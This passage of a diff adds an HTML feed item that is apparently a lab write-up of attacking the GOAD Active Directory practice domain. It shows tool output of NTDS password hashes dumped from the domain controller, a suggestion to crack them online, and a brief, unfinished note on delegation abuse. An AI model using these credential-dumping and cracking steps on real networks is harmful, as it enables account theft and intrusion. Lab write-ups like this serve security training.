+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5957852&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cf538c6fd889c94f3bb2473d8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;NORTH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1104&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;02&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f4f0cba0ec04eae62a64df80330594&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Dumped&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NTDS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashes&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;home&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kali&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cme&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;logs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;KINGSLANDING_kingslanding_2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_135107&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ntds&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;which&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;were&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;added&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;We can try and crack some of the hashes using &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;crackstation&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/goad_light/crack.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;crackstation&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Delegations&lt;/p&gt;
+&lt;p&gt;First we need to find the delegations in the domain.&lt;/p&gt;
+&lt;p&gt;There are 2 types of delegations:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Constrained&lt;/li&gt;
+&lt;li&gt;Unconstrained&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;By default child domain have Unconstrained delegation in the Parent domain&lt;/p&gt;
+&lt;p&gt;Read about them &lt;a class=&#34;link&#34; href=&#34;https://en.hackndo.com/constrained-unconstrained-delegation/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We can exploit this to achieve the same result. This is the manual way to get what imapacket-raiseChild did.&lt;/p&gt;
+&lt;p&gt;Ill addd this section later :).&lt;/p&gt;
+&lt;p&gt;We have pwned KINGSLANDING.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/f0rk3b0mb/BIC_defcon31_TTchat/main/images/download.jpeg&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;gif&#34;
+	
+	
+&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
